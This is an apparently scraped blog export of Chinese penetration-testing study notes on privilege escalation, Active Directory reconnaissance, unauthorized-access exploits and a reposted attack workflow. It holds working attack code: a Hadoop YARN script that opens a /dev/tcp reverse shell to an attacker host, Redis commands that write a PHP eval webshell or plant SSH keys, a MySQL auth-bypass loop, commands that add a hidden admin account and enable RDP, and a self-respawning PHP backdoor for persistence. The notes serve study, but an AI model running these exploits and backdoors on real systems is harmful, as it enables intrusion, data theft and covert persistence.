当前计算机的web权限 建立在web权限已经取得的情况下进行权限提升\n\n成功条件\n符合的操作系统\n符合的溢出漏洞\n\n常见步骤\n信息收集\n\n收集: 操作系统版本, 漏洞补丁, 位数(32&#x2F;64) 杀软防护, 网络, 当前用户权限 等信息\n\n常用命令:\ntxtver\nsysteminfo\nwhoami\nnetstat -ano\ntasklist /svc\n\n\n基于补丁和系统版本 位数籁进行可用溢出漏洞EXP, 上传EXP调用执行去提权\n\n操作方式-推荐使用自动提权:\n\n基于手工操作\n\n基于CS半自动提权\n\n基于MSF全自动提权\n\n\n\n手工提取工具:\n\nWindowsVulnScan: 基于主机的漏洞扫描工具 (github.com)\nVulmap: 在线本地漏洞扫描器(github.com)\nwesng：Windows 漏洞利用建议器 - 下一代 (github.com)\n网页:提权辅助网页 Windows提权辅助 (hacking8.com)\n\n\n寻找EXP利用 - 通过漏洞编号查找:\n\n推:Ascotbe&#x2F;Kernelhub: Linux、macOS、Windows 提权漏洞合集(github.com)\nExploit-DB &#x2F; Exploits + Shellcode + GHDB · GitLab\nnomi-sec&#x2F;PoC-in-GitHub：📡从 GitHub 自动收集 PoC。\nk8gege&#x2F;Ladon: Ladon大型内网渗透工具\n\n\n\n\n\n数据库第三方软件Linux提权通常, 在拥有一个webshell的时候, 一般权限都是web权限, 权限较低, 只能执行一些命令, 如查看当前用户, 网络, ip信息等, 如果想进行内网渗透就需要将权限提到最高, 如系统权限, 超级管理员权限\n创建交互shell\nlinux提权需要交互shell\n\n使用工具perl-reverse-shell.pl建立sockets, 本地可以使用nc监听端口nc -vvip 1234\n\n\n查看发行版\ncat /etc/issue\n\ncat /etc/*release\n\n查看内核版本uname -a\n\n\n查看可用的提权exp\nExploit Database - Exploits for Penetration Testers, Researchers, and Ethical Hackers (exploit-db.com)\n\n进行提取\n在目标机编译exp, 如果编译不成功在本地编译后上传到目标上gcc exp.c -o exp\n\n增加运行权限chmod +x exp\n\n运行exp\n\n切换shell-&gt;/bin/bashpython -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;\n\n查询当前用户id\n\n查询机密文件如/etc/shadow\n\n\n","slug":"内网安全-权限提升","date":"2024-04-18T03:44:47.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"1ebe60b010761b3b7defb8d55e9daafb","title":"内网安全-信息收集","content":"内网信息收集一.收集本机信息判断是否有域\nipconfig /all  在Windows IP 配置项下\n\nSysteminfo 在”域”词条下, 图中显示为WORKGROUP, 说明没有域\n\nnet time /domain\n\n存在域并且当前用户是域用户\n\n存在域，当前用户不是域用户回显:\ntxt发生系统错误 5\n\n拒绝访问\n不存在域\n\n\n\n\n\n查看当前登录域\nnet config workstation\n\n\n\n​\t\t图中工作站域为workgroup, 则不存在域\n\nping命令\nshfor /L %I in(1,1,254) DO @ping -w 1 -n 1 192.168.110.%I | findstr &quot;TTL=&quot;\n使用工具扫描探测\n\nnbtscan - 一个在本地或远程TCP&#x2F;IP网络上扫描开放的NETBIOS名称服务器的命令行工具\n\nresurrecting-open-source-projects&#x2F;nbtscan: Scan networks searching for NetBIOS information (github.com)\n\nsh用法: nbtscan-unixwiz [选项] 目标 [目标...]\n\n   目标可以是IP地址，DNS名称或地址的列表范围。\n   范围可以表示成“192.168.12.0/24”或“192.168.12.64-97”\n\n   -V        显示版本信息\n   -f        显示完整的NBT资源记录响应(推荐)\n   -H        生成HTTP请求头\n   -v        开启详细输出调试\n   -n        不查找响应IP地址的反向名称\n   -p &lt;n&gt;    绑定UDP端口(默认0)\n   -m        响应中包含MAC地址 (等同&#39;-f&#39;)\n   -T &lt;n&gt;    超时不响应 (默认2秒)\n   -w &lt;n&gt;    次写入后等待秒数 (默认10ms)\n   -t &lt;n&gt;    每个地址尝试次数(默认1次)\n   -P        以perl的hashref格式生成结果\n\n\narp-scan - ARP扫描工具\n\n使用: arp-scan使用-CSDN博客\n\n\n\n\n\n域内端口扫描\ntelnet 命令扫描\nshtelnet &lt;address&gt; &lt;port&gt;\nmetasploit 的端口扫描模块渗透之metasploit技术-端口扫描，漏洞利用_search portscan-CSDN博客\n\nNmap\n\n\n查找域控制器\nnet group &quot;Domain Controllers&quot; /domain\nnltest /DCLIST:&lt;域名&gt;\nnslookup -type=SRV _LDAP._tcp\nnet time /domain\nnetdom query pdc\n\n获取域内用户和管理员信息\n查询所有域用户列表：\n\nnet user /domain\n\nwmic useraccount get /all\n\ndsquery user\n\nnet localgroup administrators /domain\n\n\n\n查询域管理员用户组:\n\nnet group &quot;Enterprise Admains&quot; /domain\n\n\n定位域管理员:\n\nPsLoggedon - 定位域管理员_psloggedon-CSDN博客\n\nAdFind- 域内信息查询工具AdFind_adfind download-CSDN博客\n\nPVEFindADUser - 定位域管理员 PVEFindADUser-CSDN博客\n\n\n\n查找域管理进程:\n\n本机检查：\n\nshnet group &quot;Domain Admins&quot;/domain    //获取域管理员列表\nshtasklist /v       // 列出本机所有进程及进程用户\n\n\n\n\n\n查询域控制器的域用户会话：\n\n收集域控制器的列表\nshnet group &quot;Domain Controllers&quot;/domain\n收集域管理员列表\nshnet group &quot;Domain Admins&quot;/domain\nNetsess\n\n\n\n扫描远程系统上运行的任务：\n\n前提是目标使用了本地域管理员共享账户\nshFOR /F %i in (ips.txt) DO @echo [+] %i &amp;&amp; @tasklist/V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n in(names.txt) DO @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %nwas found running a process on %i &amp;&amp; pause\n\n\n扫描远程系统上NetBIOS信息：\nshfor /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp;nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt)DO @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n wasfound logged into %i\n\n利用PowerShell收集域内信息命令汇总\n域信息收集\npowershellnet time /domain                            #查看时间服务器\nnet config workstation                      #查询当前登录域及登录用户信息\nnet user /domain                            #查询域内用户\nwmic useraccount get /all                   #查询域内用户的详细信息\nnet user xie /domain                        #查看指定域用户xie的详细信息\nnet view /domain                            #查看有几个域\nnet view /domain:xxx                        #查看域内的主机\nnet group /domain                           #查看域里面的组\nnet group &quot;domain users&quot;  /domain           #查看域用户\nnet group &quot;domain controllers&quot; /domain      #查看域控制器\nnet group &quot;domain computers&quot; /domain        #查看域内所有的主机\nnet group &quot;domain admins&quot;  /domain          #查看域管理员,该组内的成员对域控拥有完全控制权\nnet group &quot;enterprise admins&quot; /domain       #查看企业管理组,该组内的成员对域控拥有完全控制权\nnet group &quot;domain guest&quot;  /domain           #查看域访客组,权限较低\n \nnltest  /domain_trusts                      #查看域信任信息\nnet accounts /domain                        #查询域密码策略\nwhoami /user                                #查看用户SID和域SID，如用户的SID是：S-1-5-21-2189311154-2766837956-1982445477-520 则域SID则是去掉最后的520：S-1-5-21-2189311154-2766837956-1982445477\n \n以下命令只能在域控上查询\ndsquery user                                #查询目录中的用户\ndsquery computer                            #查询目录中的主机\ndsquery group                               #查询目录中的组.\ndsquery ou                                  #查询目录中的组织单元.\ndsquery site                                #查询目录中的站点\ndsquery server                              #查询域控\ndsquery contact                             #查询目录中的联系人\ndsquery subnet                              #查询目录中的子网\ndsquery quota                               #查询目录中的配额规定.\ndsquery partition                           #查询目录中的分区.\ndsquery *                                   #用通用的LDAP查询来查找目录中的任何对 \ndsquery server –domain xie.com | dsget server–dnsname –site     #搜索域内域控制器的DNS主机名和站点名\ndsquery computer domainroot –name -xp –limit 10      #搜索域内以-xp结尾的机器10台\ndsquery user domainroot –name admin -limit           #搜索域内以admin开头的用户10个\n查询域控的主机名\npowershell方法一：net group &quot;domain controllers&quot; /domain       #这里查询结果后面会多一个 $ \n方法二：nltest /DCLIST:xie.com\n方法三：net time /domain \n方法四：nslookup -type=srv _ldap._tcp\n方法五：查看DNS服务器的地址，一般DNS服务器的IP就是域控的地址\n方法六：netdom query pdc                             #该命令只能在域控上执行\n方法七：dsquery server                               #该命令只能在域控上执行\n\n利用PowerSploit\nPowerShell 常用的执行权限共有四种\nshRestricted：默认设置，不允许执行任何脚本。\nAllsigned：只能运行经过证书验证的脚本。\nUnrestricted：权限最高，可以执行任意脚本。\nRemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名。在 PowerShell 中输入“Get-ExecutionPolicy”，可以看到当前权限\n\n使用PowerSploit的PowerView脚本\n\n导入脚本\nshImport-Module .\\PowerView.ps1\n功能:\nsh\nGet-NetDomain    // 获取当前用户所在的域名称。\nGet-NetUser    // 返回所有用户的详细信息。\nGet-NetDomainController    // 获取所有域控制器。\nGet-NetComputer    // 获取所有域内机器的详细信息。\nGet-NetOU    // 获取域中的 OU 信息。\nGet-NetGroup    // 获取所有域内组和组成员信息。\nGet-NetFileServer    // 根据 SPN 获取当前域使用的文件服务器。\nGet-NetShare    // 获取当前域内所有网络共享。\nGet-NetSession    // 获取在指定服务器存在的会话信息。\nGet-NetRDPSession    // 获取在指定服务器存在的远程连接信息。\nGet-NetProcess    // 获取远程主机的进程信息。\nGet-UserEvent    // 获取指定用户的日志信息。\nGet-ADObject    // 获取活动目录的对象信息。\nGet-NetGPO    // 获取域所有组策略对象。\nGet-DomainPolicy    // 获取域默认或域控制器策略。\nInvoke-UserHunter    // 用于获取域用户登录计算机及该用户是否有本地管理权限。\n\n\n\n","slug":"内网安全-信息收集","date":"2024-04-11T11:50:10.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"81102e6cf240e741d5c7997d1b670e8a","title":"内网安全-基本概念","content":"内网基本概念局域网又称内网, 是指在某一区域内由多台计算机互联成的计算机组。\n工作组工作组（Work Group）就像一个可以自由进入和退出的社团，方便同组的计算机互相访问。没有集中管理作用，所有计算机都是对等的。\n\n在一个网络内，可能有成百上千台电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱。\n为了解决这一问题，早在Windows 9x&#x2F;NT&#x2F;2008就引用了“工作组”这个概念，将不同的电脑一般按功能分别列入不同的组中，如财务部的电脑都列入“财务部”工作组中，人事部的电脑都列入“人事部”工作组中。\n你要访问某个部门的资源，就在“网上邻居”里找到那个部门的工作组名，双击就可以看到那个部门的电脑了。\n\n域环境域（Domain）是一个有安全边界的计算机集合。可以简单的把域理解成升级版的工作组，但有一个严格的集中管理控制机制。\n\n与工作组的“松散会员制”有所不同，“域”是一个相对严格的组织。“域”指的是服务器控制网络上的计算机能否加入的计算机组合。\n实行严格的管理对网络安全是非常必要的。在对等网模式下，任何一台电脑只要接入网络，就可以访问共享资源。尽管对等网络上的共享文件可以加访问密码，但是非常容易被破解。在由Windows 9x构成的对等网中，数据是非常不安全的。\n在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为“域控制器（Domain Controller，简写为DC）”。“域控制器”中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当电脑联入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息不正确，域控制器就拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，只能以对等网用户的方式访问Windows共享出来的资源，这样就一定程度上保护了网络上的资源\n想把一台电脑加入域，仅仅使它和服务器在“网上邻居”能够相互看到是远远不够的，必须要由网络管理员进行把这台电脑加入域的相关操作。\n\n域控制器-DC域控制器（Domain Controller，DC）相当于一个单位的门禁系统。DC中存在由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。\nDC是整个域的通信枢纽。\n\n一般情况下，域控制器集成了DNS服务，可以解析域内的计算机名称（基于TCP&#x2F;IP），解决了工作组环境不同网段计算机不能使用计算机名互访的问题\n\n活动目录-AD活动目录（Active Directory，AD）是指域环境中提供目录服务的组件\n在目录中存储的信息可以是用户，组，计算机，共享资源，打印机，联系人等信息。目录服务可以帮助用户快速准确地从目录中找到需要的信息服务。\n\n活动目录主要提供的功能：\n\n\n\n\n\n\n\n\n\n账号集中管理：所有账号存储在服务器中，方便执行命令。\n软件集中管理：统一推送软件，安装网络打印机。\n增强安全性：统一部署杀毒软件，病毒扫描任务，集中管理计算机权限，统一制定用户密码策略等。\n\n\n如果内网中的一台计算机上安装了AD，它就变成了DC（用于存储AD库的计算机）。\n\nDC的本质是一台计算机，AD的本质是提供目录服务的组件。\n\n安全域的划分将一组安全等级相同的计算机划入同一个网段内， 在网络边界上通过防火墙来实现对其他安全域的NACL（网络访问控制策略）， 使得其风险最小化。\n一般安全域划分为：DMZ和内网。\n\nDMZ（Demilitarized Zone 非军事化区）称为隔离区。 为了解决安装防火墙后外部网络不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。\nDMZ不能访问内网，DMZ不能访问外网（此策略有例外，如mail服务）。\n\n内网又可以划分为：办公区和核心区。\n办公区会安装防病毒软件、主机入侵检测产品（HIDS）等，运维使用堡垒机（跳板机）来统一管理用户的登陆行为。\n\n\n域的分类\n单域\n例如主公司和子公司都独自形成了一个域环境，称为单域，由此延伸出父域和子域。\n\n父域和子域\n父域可以管理子域。\n\n域树和域森林\n域的框架结构，很多分支形成了域森林。\n\n\n内网常用命令\n\n\n\n\n\n\n\n\nnet user ——&gt; 本机用户列表net localhroup administrators ——&gt; 本机管理员[通常含有域用户]net user &#x2F;domain ——&gt; 查询域用户net group &#x2F;domain ——&gt; 查询域里面的工作组net group “domain admins” &#x2F;domain ——&gt; 查询域管理员用户组net localgroup administrators &#x2F;domain ——&gt; 登录本机的域管理员net localgroup administrators workgroup\\user001 &#x2F;add —–&gt;域用户添加到本机net group “Domain controllers” ——-&gt; 查看域控制器(如果有多台)ipconfig &#x2F;all ——&gt; 查询本机IP段，所在域等net view ——&gt; 查询同一域内机器列表net view &#x2F;domain ——&gt; 查询域列表net view &#x2F;domain:domainname —–&gt; 查看workgroup域中计算机列表\n内网渗透基本流程\n信息收集\n权限获取\n横向移动\n权限维持\n痕迹消除\n\n","slug":"内网安全-基本概念","date":"2024-04-10T07:41:44.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"9f7b33d2add141a55d4dd7ea060f1cd5","title":"未授权访问","content":"漏洞简述描述\n未授权访问漏洞，是在攻击者没有获取到登录权限或未授权的情况下，或者不需要输入密码，即可通过直接输入网站控制台主页面地址，或者不允许查看的链接便可进行访问，同时进行操作。\n\n危害\n泄露用户信息，系统信息\n某些服务和系统中，未授权访问还可以执行系统命令，操作系统文件，导致系统的整体安全遭到破坏\n\n漏洞发现判断服务开放\nNmap端口扫描\n组合猜测\n\n判断服务类型\n数据库\n文件传输\n远程控制\n数据通信\n\n漏洞实例MySQL\n环境:Mysql 身份认证绕过漏洞（CVE-2012-2122）\n\n原理:\n\n\n\n\n\n\n\n\n\n当连接MariaDB&#x2F;MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。\n\n利用:\nsqlfor i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done\n\nHadoop\n环境:Vulhub - Docker-Compose file for vulnerability environment\n\n原理:\n\n\n\n\n\n\n\n\n\n负责对资源进行同一管理调度的ReasourceManager组件的UI管理界面开放在8080&#x2F;8088端口，攻击者无需认证即可通过REST API部署任务来执行任意命令，最终可完全控制集群中所有的机器。\n\n脚本:\npython#!/usr/bin/env python\n\nimport requests\n\ntarget = &#39;http://127.0.0.1:8088/&#39;\nlhost = &#39;192.168.0.1&#39; # put your local host ip here, and listen at port 9999\n\nurl = target + &#39;ws/v1/cluster/apps/new-application&#39;\nresp = requests.post(url)\napp_id = resp.json()[&#39;application-id&#39;]\nurl = target + &#39;ws/v1/cluster/apps&#39;\ndata = &#123;\n    &#39;application-id&#39;: app_id,\n    &#39;application-name&#39;: &#39;get-shell&#39;,\n    &#39;am-container-spec&#39;: &#123;\n        &#39;commands&#39;: &#123;\n            &#39;command&#39;: &#39;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#39; % lhost,\n        &#125;,\n    &#125;,\n    &#39;application-type&#39;: &#39;YARN&#39;,\n&#125;\nrequests.post(url, json=data)\n\n\nRedis\n原理:\n\nredis默认是没有密码验证的，可以免密码登录操作，攻击者可以通过操作redis进一步控制服务器\nRedis未授权访问在4.x&#x2F;5.0.5以前版本下，可以使用master&#x2F;slave模式加载远程模块，通过动态链接库的方式执行任意命令。\n\n\n利用:\n\n写webshell\n\n利用前提:\n\n靶机redis链接未授权，在攻击机上能用redis-cli连上, 并未登陆验证\n\n开了web服务器，并且知道路径, 需要具有文件读写增删改查权限\n\n\n\n上传webshell\nshconfig get dir #查看redis数据库路径\nconfig set dir /root/redis-2.8.17# #修改靶机Redis数据库路径\nconfig set dbfilename 22.php #生成22.php文件\nset xxx &quot;\\r\\n\\r\\n&lt;?php phpinfo();?&gt;\\r\\n\\r\\n&quot;#将一句话木马写入文件中\n#&quot;\\r\\n\\r\\n&quot;是换行的意思，用redis写入文件会自带一些版本信息，如果不换行可能导致无法执行。\nset xxx &quot;\\r\\n\\r\\n&lt;?php eval($_POST[whoami]);?&gt;\\r\\n\\r\\n&quot;#上传木马可以通过蚁剑连接\nsave#保存\n\n\nssh密钥连接\n\n利用前提:\n\nroot身份运行\n存在&#x2F;root&#x2F;.ssh目录\n\n\n将公钥上传到靶机\nshtype key.txt | redis-cli.exe -h 192.168.43.141 -x set xxx#如果是linux 将type换成cat\n#将公钥作为value插入到数据库中，key随便啥值。\nredis-cli.exe -h 192.168.43.141 config set dir /root/.ssh\n#修改redis数据库路径\nredis-cli.exe -h 192.168.43.141 config set dbfilename authorized_keys\n#生成缓冲文件authorized_keys\nredis-cli.exe -h 192.168.43.141 save\n#保存\nssh -i id_rsa root@192.168.43.141\n#连接\n\n\nRCE自动化利用脚本vulhub&#x2F;redis-rogue-getshell: redis 4.x&#x2F;5.x master&#x2F;slave getshell module (github.com)\n\n\n\n\n常见漏洞汇总\n常用的30+种未授权访问漏洞汇总 - FreeBuf网络安全行业门户\n\n网络安全周周学 | 常见未授权访问漏洞汇总\n\n\n漏洞防范","slug":"未授权访问","date":"2024-03-26T07:47:00.000Z","categories_index":"","tags_index":"网络安全,学习日志","author_index":"Myprefer"},{"id":"8b9aeb65c936050fec0fc9c20edbf39b","title":"(转)渗透测试-基本流程","content":"一般来说，渗透测试的基本流程如下：\n\n确定目标\n信息收集\n漏洞探测\n漏洞利用getshell\n内网转发\n内网渗透\n痕迹清除\n撰写渗透测试报告\n\n一 确定目标这个没什么好说的就是确定你的渗透目标是什么。\n二 信息收集信息收集是整个渗透测试中最重要的一步，你要把你要攻击的目标全部探测清楚，才能更好的攻击。信息收集的越丰富，内容或情报收集的越多，攻击的成功率就越高。\n而信息收集到底要收集哪些信息呢？接下来，我就给大家整理了一下，渗透测试中常见的一些需要收集的信息。\n1.主机扫描(Nessus)\n对目标主机进行扫描，而不仅仅是对网站进行扫描，扫描目标主机开放了哪些端口，扫描端口运行的服务，目标主机上有哪些漏洞。\n主机扫描的工具也有很多，比如：Nessus\n2.端口扫描(nmap)\n需要知道目标服务器开放了哪些端口，常见的如 135 、137 、138 、139 、445，这几个端口经常爆发漏洞。以下是一些服务端口的漏洞：\n22——&gt;ssh弱口令\n873——&gt;rsync 未授权访问漏洞\n3306——&gt;mysql弱口令\n6379——&gt;redis未授权访问漏洞\n端口扫描工具有nmap和masscan。nmap扫描的准确性较高，但是扫描的比较慢。masscan扫描的比较快，但是准确性较低。\n3.网站敏感目录和文件\n扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏\n\n后台目录：弱口令，万能密码，爆破\n安装包：获取数据库信息，甚至是网站源码\n上传目录：截断、上传图片马等\nmysql管理接口：弱口令、爆破，万能密码，然后脱裤，甚至是拿到shell\n安装页面 ：可以二次安装进而绕过\nphpinfo：会把你配置的各种信息暴露出来\n编辑器：fck、ke、等\niis短文件利用：条件比较苛刻 windows、apache等\n\n提到了网站敏感目录我们就不得不提 robots.txt 文件了\nrobots.txt 文件是专门针对搜索引擎机器人robot 编写的一个纯文本文件。我们可以在这个文件中指定网站中不想被robot访问的目录。这样，我们网站的部分或全部内容就可以不被搜索引擎收录了，或者让搜索引擎只收录指定的内容。因此我们可\n以利用robots.txt让Google的机器人访问不了我们网站上的重要文件，GoogleHack的威胁也就不存在了。\n假如编写的robots.txt文件内容如下：\ntxtUser-agent: *\nDisallow: /data/\nDisallow: /db/\nDisallow: /admin/\nDisallow: /manager/\nAllow:/images/其中“Disallow”参数后面的是禁止robot收录部分的路径，例如我们要让robot禁止收录网站目录下的“data”文件夹，只需要在Disallow参数后面加上 &#x2F;data&#x2F; 即可。如果想增加其他目录，只需按此格式继续添加。文件编写完成后将其上传到网站的根目录，就可以让网站远离Google Hack了。\n虽然robots文件目的是让搜索蜘蛛不爬取想要保护的页面，但是如果我们知道了robots文件的内容的话，我们就可以知道目标网站哪些文件夹不让访问，从侧面说明这些文件夹是很重要的了。\n探测目标网站后台目录的工具有：wwwscan 、御剑 、 dirbuster、cansina 等\n4.旁站和C段扫描\n旁站指的是同一服务器上的其他网站，很多时候，有些网站可能不是那么容易入侵。那么，可以查看该网站所在的服务器上是否还有其他网站。如果有其他网站的话，可以先拿下其他网站的webshell，然后再提权拿到服务器的权限，最后就自然可以拿下该网站了！\n对于红蓝对抗和护网，C段扫描比较有意义。对于单独网站的渗透测试，C段扫描意义不大。C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。\n5.网站漏洞扫描\n网站漏洞扫描就是直接对网站进行漏洞探测了。网站漏洞扫描也有很多工具。比如 AWVS、AppScan、OWASP-ZAP、nessuss等等。但是需要注意的是，使用漏扫工具直接对网站进行扫描，因为一下子流量过大，有些网站可能会崩溃。所以一般最好不要使用漏洞扫描工具对网站进行扫描。并且如果未经授权就用漏扫对网站进行扫描还是违法的！\n6.网站指纹识别\n在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。CMS又称整站系统。常见的CMS有：WordPress、Dedecms、Discuz、PhpWeb、PhpWind、Dvbbs、PhpCMS、ECShop、、SiteWeaver、AspCMS、帝国、Z-Blog等。\n常见的网站指纹识别工具有：whatweb等。\n7.公司敏感信息网上搜集\n当确定了公司后，我们可以去互联网上查询与该公司有关的任何信息。比如，公司的邮箱格式，公司的员工姓名，以及与该公司有关的任何信息。并且，我们还可以去Github、码云等代码托管平台上查找与此有关的敏感信息，有些粗心的程序员在将代码上传至代码托管平台后，并没有对代码进行脱敏处理。导致上传的代码中有包含如数据库连接信息、邮箱密码、还有可能有泄露的源代码等。\n8.域名信息的收集\n当我们确定了要渗透的目标，也就是知道了其域名，接下来我们需要收集域名对应的 ip，域名的whois信息、子域名等等一系列与域名相关的信息。\n判断域名对应的IP：首先，我们要判断该域名是否存在CDN的情况，我们可以去在线CDN查询网站：多个地点Ping服务器,网站测速 - 站长工具 。如果查询出的ip数量大于一个的话，则说明该ip地址不是真实的服务器地址。以我的经验来看，如果是2个或者3个，并且这几个地址是同一地区的不同运营商的话，则很有可能这几个地址是服务器的出口地址，该服务器在内网中，通过不同运营商NAT映射供互联网访问，同时采用几个不同的运营商可以负载均衡和热备份。如果是多个ip地址，并且这些ip地址分布在不同地区的话，则基本上可以断定就是采用了CDN了。\n域名的whois信息：whois是用来查询域名注册所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。早期的whois查询多以命令行接口存在，但是现在出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令行接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名&#x2F;IP的whois信息由对应的管理机构保存。\n三 漏洞探测当我们收集到了足够多的信息之后，我们就要开始对网站进行漏洞探测了。探测网站是否存在一些常见的Web漏洞，比如：\n\nSQL注入\nXSS跨站脚本\nCSRF跨站请求伪造\nXXE漏洞\nSSRF服务端请求伪造漏洞\n文件包含漏洞\n文件上传漏洞\n文件解析漏洞\n远程代码执行漏洞\nCORS跨域资源共享漏洞\n越权访问漏洞\n目录浏览漏洞和任意文件读取&#x2F;下载漏洞\nstruts2漏洞\nJAVA反序列化漏洞\n\n这些是网站经常发现的一些漏洞，还有一些网站漏洞，这里我就不一一列举出来了。\n网站漏洞扫描工具也有很多，比如：\n\nAWVS\nAppScan\nOwasp-Zap\nNessus\n\n网站漏洞扫描工具我就列举这几种，还有很多，最常用的是这几个！\n四 漏洞利用当我们探测到了该网站存在漏洞之后，我们就要对该漏洞进行利用了。不同的漏洞有不同的利用工具，很多时候，通过一个漏洞我们很难拿到网站的webshell，我们往往需要结合几个漏洞来拿webshell。常用的漏洞利用工具如下：\nSQL注入 ——&gt; Sqlmap\nXSS跨站脚本——&gt; Beef-XSS\n抓包改包工具——&gt; Burpsuite工具 、 Fidder抓包软件\n文件上传漏洞，上传漏洞的话，我们一般会上传一句话木马上去，进而再获得webshell，传送门——&gt; Webshell和一句话木马\n但是，获得了webshell后，一般权限很低，所以我们需要提权，可以选择反弹一个MSF类型的shell提权：Metasploit Framework(MSF)的使用 、 Msfvenonm生成一个后门木马，也可以反弹一个CobaltStrike类型的shell：渗透测试神器Cobalt Strike的使用， 也可以MSF和CobaltStrike联动：MSF和CobaltStrike联动 也可以使用其他提权：Windows提权 、 Linux提权\n五 内网转发当我们获取到了网站的Webshell之后，如果我们想获取该主机的有关信息，我们可以将该主机的webshell换成MSF的shell。直接生成一个木马，然后在菜刀中执行该木马，我们就能接收到一个MSF类型的shell了。\n如果我们还想进一步的探测内网主机的信息的话，我们就需要进行内网转发了。我们是不能直接和内网的主机通信的，所以我们就需要借助获取到的webshell网站的服务器和内网主机进行通信。\n六 内网横向渗透当我们在获取了外网服务器的权限，进入该系统后，我们要想尽办法从该服务器上查找到我们想要的信息。\n对于windows主机，我们应该多去翻翻目录，或许能有很多意想不到的结果。很多人习惯把账号密码等容易忘的东西存放在备忘录中，或者是桌面上。我们还可以查找数据库的连接文件，查看数据库的连接账号密码等敏感信息。当我们获得了windows主机的账号密码，或者是自己创建了新用户后，我们为了不被网站管理员发现和不破坏服务器。我们尽量不要使用远程桌面。因为使用远程桌面动静比较大，如果此时服务器管理员也在登录，而你此时通过远程桌面登录的话，会将管理员挤掉，而你也将很快的被管理员踢掉。对于实在是要远程桌面登录的情况的话，我们尽量不要新建一个用户进行登录。我们可以激活 guest 用户，然后将其加入 administrators 组里面，用 guest 用户身份登录。在RDP远程登录后，我们可以查看其他用户桌面上和其他目录有哪些软件，我们要找的目标有以下。\n\nFTP相关的软件\n数据库相关的软件\n打开浏览器，查看历史记录，查看某些网站是否保存有用户密码。利用工具查看浏览器保存的密码\n\n从该主机上找到的账号密码，我们可以做一个字典，在对内网其他机器进行爆破的时候，很有可能是同密码。\ntxtnet user  guest  /active:yes                      #激活guest用户\nnet localgroup  administrators  guest  /add       #将guest用户添加到\nnet user guest    密码                            #更改guest用户密码\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f                          #开启3389端口对于Linux主机，我们可以查看开放的端口号，开放的服务，与其建立连接的内网主机。查看目录，查找网站数据库连接密码。总之，就是尽可能的多查找一些账号密码，这对于内网的账号爆破非常有用。\n在搭建了隧道可以通内网后，我们首先就需要对内网进行资产发现了。但是对于内网存活网段的判断是一个大问题。内网很有可能同时存在 10.0.0.0&#x2F;8、172.16.0.0&#x2F;16、192.168.0.0&#x2F;24 网段。这就需要我们用扫描器对其进行探测了。通过代理进行内网扫描不建议使用nmap。如果是在本地主机通过代理扫描，可以图形化界面的话，可以使用 RouterScan 、御剑高速TCP全端口扫描器、IIS_Scanner。但是注意线程调低一点，不然代理很容易崩了。如果使用命令行扫描器的话，可以使用S扫描器。在扫描了内网资产和端口开放情况后，对于445端口，就可以打一波MS17_010。但是注意通过代理打445，和之前的是不一样的。传送门——&gt; 内网渗透之MS17-010 。对于3389端口，可以打一波CVE-2019-0708，传送门——&gt; CVE-2019-0708 远程桌面漏洞复现 。对于1433&#x2F;3306&#x2F;6379等端口，可以尝试爆破，利用之前收集到的账号密码成功率更高哦。\n权限维持\n在拿到目标主机的权限后，很有可能当时我们并不能获取到想要的东西，需要进行长期的潜伏，特别是在内网渗透中，需要进行长期的信息收集。这时，权限维持就很重要了。我们需要维持住获得的现有权限。\nWeb后门\n1：隐藏后门文件(将文件设置为隐藏)\n2：不死马，该脚本每5秒向服务器创建test.php，并写入一句话免杀木马。结合attrib命令隐藏文件更好地建立后门。\ntxt&lt;?php\n    set_time_limit(0);//程序执行时间\n    ignore_user_abort(1);//关掉终端后脚本仍然运行\n    unlink(__FILE__);//文件完整名\n    while(1)&#123;\n        file_put_contents(&#39;test.php&#39;,&#39;&lt;?php $a=array($_REQUEST[&quot;x&quot;]=&gt;&quot;3&quot;);\n        $b=array_keys($a)[0];\n        eval($b);?&gt;&#39;);\n        sleep(5);\n    &#125;\n?&gt;3：404页面隐藏后门，或者在其他自带文件中插入后门代码\n注：以上几种后门方法均能被D盾等工具检测到\nWindows系统\n1：建立隐藏用户，在用户名后加 $\n2：在开机启动目录下放置木马文件，只要目标机器重启，将回连我们的远控\n3：MSF里的 persistence 